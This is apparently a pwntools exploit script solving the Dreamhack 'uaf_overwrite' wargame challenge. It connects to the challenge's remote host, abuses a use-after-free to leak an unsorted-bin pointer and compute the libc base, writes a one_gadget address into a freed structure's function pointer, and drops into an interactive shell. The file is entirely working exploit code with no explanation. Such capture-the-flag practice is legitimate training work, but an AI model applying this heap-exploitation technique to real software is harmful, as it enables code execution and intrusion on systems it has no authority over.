from pwn import *

context.log_level = "debug"

#p = process("./uaf_overwrite_patched")
p = remote("host3.dreamhack.games", 21133)
libc = ELF("./libc-2.27.so")
e = ELF("./uaf_overwrite_patched")

p.recvuntil(b'> ')
p.sendline(b'3')
p.recvuntil(b'Size: ')
p.sendline(b'1056')
p.recvuntil(b'Data: ')
p.sendline(b'A')
p.recvuntil(b'Free idx: ')
p.sendline(b'10')

#gdb.attach(p, gdbscript= '''source ~/pwndbg/gdbinit.py''')
#pause()

p.recvuntil(b'> ')
p.sendline(b'3')
p.recvuntil(b'Size: ')
p.sendline(b'1056')
p.recvuntil(b'Data: ')
p.send(b'AAAAAAAA')
p.recvuntil(b'Data: ')
p.recvuntil(b'Free idx: ')
p.sendline(b'0')

p.recvuntil(b'> ')
p.sendline(b'3')
p.recvuntil(b'Size: ')
p.sendline(b'1056')
p.recvuntil(b'Data: ')
p.send(b'AAAAAAAA')

p.recvuntil(b'AAAAAAAA')
unsortedbin_add = u64(p.recv(6).ljust(8, b'\x00'))
log.info(f"unsortedbin_add : {hex(unsortedbin_add)}")

p.recvuntil(b'Free idx: ')
p.sendline(b'2')

main_arena = libc.sym["__malloc_hook"] + 0x10

unsortedbin_offset = main_arena + 0x60
libc_base = unsortedbin_add - unsortedbin_offset

log.info(f"libc_base : {hex(libc_base)}")
log.info(f"system : {hex(libc_base + libc.sym[b'system'])}")

one_shot = 0x10a41c + libc_base
log.info(f"one_shot : {hex(one_shot)}")

p.recvuntil(b'> ')
p.sendline(b'1')
p.recvuntil(b'Human Weight: ')
p.sendline(b'4141')
p.recvuntil(b'Human Age: ')
p.sendline(str(one_shot))

p.recvuntil(b'> ')
p.sendline(b'2')
p.recvuntil(b'Robot Weight: ')
p.sendline(b'4242')

p.interactive()
